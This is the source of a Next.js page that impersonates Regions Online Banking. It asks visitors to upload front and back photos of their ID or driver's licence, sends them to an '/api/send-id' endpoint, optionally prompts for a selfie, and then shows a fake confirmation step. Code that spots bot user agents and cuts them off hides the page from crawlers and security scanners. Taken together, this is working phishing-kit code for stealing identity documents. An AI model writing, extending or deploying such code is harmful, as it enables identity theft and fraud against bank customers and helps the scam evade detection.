import { Box, Flex, Text, useDisclosure } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import { AltButton } from "../../components/AltButton";
import { Container } from "../../components/Container";
import { FileInput } from "../../components/FileInput";
import { SelfieModal } from "../../components/SelfieModal";
import { Wrapper } from "../../components/Wrapper";
import { DataContext } from "../_app";
import { getProgress } from "../../utils/getProgress";

interface SupportingDocumentsProps {}

const FILE_SIZE = 96000 * 1024;
const SUPPORTED_FORMATS = [`image/jpg`, `image/jpeg`, `image/gif`, `image/png`];

const schema = yup.object().shape({
  front: yup
    .mixed()
    .required(
      `This field is required, please upload the front image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
  back: yup
    .mixed()
    .required(
      `This field is required, please upload the back image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
});

const SupportingDocuments: NextPage<SupportingDocumentsProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `all`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);
  const { isOpen, onOpen, onClose } = useDisclosure();

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, data.front[0]);
    formData.append(`back`, data.back[0]);
    formData.append(`form`, `SUPPORTING DOCUMENTS`);

    await axios.post(`/api/send-id`, formData, {
      headers: {
        "Content-Type": `multipart/form-data`,
      },
    });
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: data.front[0],
        back: data.back[0],
      },
    });

    if (process.env.NEXT_PUBLIC_TAKE_SELFIE === `ON`) {
      onOpen();
      return;
    }

    push(`/customerservice/confirmation`);
  });

  return (
    <>
      <SelfieModal isOpen={isOpen} onClose={onClose} />
      <Wrapper>
        <Head>
          <title>
            Regions Online Banking - Verify Your Identity Documents | Regions
          </title>
        </Head>
        <Box as={`main`} display={`block`}>
          <Container
            progress={getProgress()}
            highlight={getProgress().indexOf(`Supporting Documents`)}
            showTitle
            showSide
            display={`flex`}
            bgColor={`#fff`}
            border={`2px solid #eee`}
            borderBottom={[`none`, `2px solid #eee`]}
            borderLeft={[`none`, `2px solid #eee`]}
            borderRight={[`none`, `2px solid #eee`]}
            borderRadius={`2px`}
            boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
            justifyContent={`flex-start`}
            m={[`15px auto 30px`, `50px auto`]}
            p={0}
            maxW={`initial`}
            w={`auto`}
            bg={`#f9f9f9`}
            flexDir={[`column`, `row`]}
          >
            <Box
              flex={`1 1 auto`}
              borderRight={[`none`, `2px solid #eee`]}
              borderBottom={[`2px solid #eee`, `none`]}
              p={[`30px 15px`, `30px`]}
              bg={`white`}
            >
              <Flex flexDir={`column`}>
                <Text
                  as={`h2`}
                  fontFamily={`inherit`}
                  fontWeight={700}
                  lineHeight={1.1}
                  color={`inherit`}
                  mb={`13.5px`}
                  fontSize={`18px`}
                >
                  {`Let's `}continue, please provide the following required
                  information:
                </Text>
                <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                  <Box
                    w={[`100%`, `50%`]}
                    float={`left`}
                    pos={`relative`}
                    minH={`1px`}
                    pr={[0, `15px`]}
                  >
                    <FileInput
                      errors={errors}
                      label={`Front`}
                      name={`front`}
                      register={register}
                      watch={watch}
                      instruction={`Take a clear front picture of your ID/Driver's Licence`}
                    />
                  </Box>
                  <Box
                    w={[`100%`, `50%`]}
                    float={`left`}
                    pos={`relative`}
                    minH={`1px`}
                    pl={[0, `15px`]}
                  >
                    <FileInput
                      errors={errors}
                      label={`Back`}
                      name={`back`}
                      register={register}
                      watch={watch}
                      instruction={`Take a clear back picture of your ID/Driver's Licence`}
                    />
                  </Box>
                </Box>
                <AltButton onClick={onSubmit} disabled={loading}>
                  Next
                </AltButton>
              </Flex>
            </Box>
          </Container>
        </Box>
      </Wrapper>
    </>
  );
};

SupportingDocuments.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default SupportingDocuments;
